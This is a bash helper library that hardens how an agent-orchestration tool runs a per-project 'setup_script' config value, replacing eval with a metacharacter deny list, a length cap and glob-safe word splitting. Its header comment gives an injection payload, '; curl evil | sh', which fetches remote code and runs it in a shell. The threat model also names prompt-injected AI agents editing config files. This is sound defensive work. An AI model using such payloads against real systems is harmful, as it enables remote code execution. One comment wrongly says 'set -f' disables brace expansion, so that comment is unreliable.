# lib/setup_script.sh — safe execution of per-project setup_script values.
# Sourced by integration-branch.sh. Must NOT have set -euo pipefail or shebang.
#
# Depends on the caller defining: log_info, log_warn, log_error.
#
# `setup_script` is a per-project config field whose value runs before the
# employee/validator does its work. Historically it was passed straight to
# `bash -c` / `eval`, which made config-file write access equivalent to
# arbitrary code execution as the agent user. Anything that can write to the
# manager-config — a prompt-injected employee writing to the file via its
# normal tools, a compromised dashboard API caller, a misconfigured
# permission — could pivot to a shell.
#
# The fix keeps the inline-command UX (the field is still free-text;
# `npm install`, `pip install -r requirements.txt`, `./scripts/setup.sh`, etc.
# all still work) but rejects anything that would let an attacker chain or
# escape: command separators, pipes, redirection, command/variable
# substitution, subshells, backslash escapes, and newlines. Length is capped
# at 1024 chars so an attacker can't smuggle a payload through some
# downstream consumer.
#
# This is defense-in-depth, not a sandbox: the configured command itself
# still runs with whatever privileges the agent user has. The point is that
# `setup_script="; curl evil | sh"` no longer pivots to RCE just because the
# attacker found a way to write the field. For richer setup logic, commit a
# script to the repo and reference it (`./scripts/setup.sh`) — that path is
# under the repo's review process, not the config file's.
#
# See issue #179.

# `readonly` so an attacker with shell-level access to the agent process
# can't widen the cap and re-validate a giant payload. Belt-and-braces.
# Guarded so re-sourcing the file is a no-op rather than an error.
if [ -z "${SETUP_SCRIPT_MAX_LEN:-}" ]; then
    readonly SETUP_SCRIPT_MAX_LEN=1024
fi

validate_setup_script() {
    # validate_setup_script <script>
    # Returns 0 if safe to run, non-zero (with log_error) otherwise.
    local s="$1"
    if [ -z "$s" ]; then
        return 0
    fi
    if [ "${#s}" -gt "$SETUP_SCRIPT_MAX_LEN" ]; then
        log_error "setup_script rejected: length ${#s} exceeds $SETUP_SCRIPT_MAX_LEN"
        return 1
    fi
    # Explicit per-character alternations — avoids ambiguity around how bash
    # `case` brackets handle backtick / dollar / backslash inside patterns.
    case "$s" in
        *';'*|*'&'*|*'|'*|*'`'*|*'$'*|*'<'*|*'>'*|*'('*|*')'*|*'\'*|*$'\n'*)
            log_error "setup_script rejected: contains forbidden shell metacharacter (one of ; & | \` \$ < > ( ) \\ or newline)"
            return 1
            ;;
    esac
    return 0
}

run_setup_script() {
    # run_setup_script <script> [label]
    # Validates and executes; returns the script's exit status, or non-zero
    # on validation failure. Output is left on the caller's stdout/stderr so
    # they can pipe/tail as they like. Executes via bash word-splitting on a
    # vetted string — no `eval`, no `bash -c "$untrusted"`.
    #
    # Does NOT log the script content itself — callers should announce
    # `log_info "Running setup: $s"` *after* a successful
    # `validate_setup_script` so a rejected payload never reaches the log.
    # This function deliberately stays log-quiet (other than the validator's
    # rejection error) so its output, when piped, is solely the executed
    # command's stdout/stderr.
    local s="$1"
    local label="${2:-setup}"
    if [ -z "$s" ]; then
        return 0
    fi
    if ! validate_setup_script "$s"; then
        log_error "$label aborted: setup_script failed validation"
        return 1
    fi
    # Word-split the validated string and exec the resulting argv directly.
    # `set -- $s` here is intentional: we *want* IFS splitting on whitespace
    # so `npm install -r requirements.txt` becomes a 4-arg invocation. The
    # validator above already ensured no metacharacters can re-enter the
    # shell at this point.
    #
    # `set -f` disables pathname expansion (globbing) and brace expansion
    # for the duration of the split. Without it, a token like `*` or
    # `{a,b}` would still expand against the workspace contents — not an
    # injection vector since the validator rejects `(` `)`, but a
    # predictability gap (a file in the workspace named `--no-verify`
    # could feed itself into the argv via `*`). Restore the prior glob
    # state via `set +f` based on whether `f` was in `$-`.
    local saved_glob_off=0
    case "$-" in *f*) saved_glob_off=1 ;; esac
    set -f
    # shellcheck disable=SC2086
    set -- $s
    if [ "$saved_glob_off" -eq 0 ]; then
        set +f
    fi
    "$@"
}
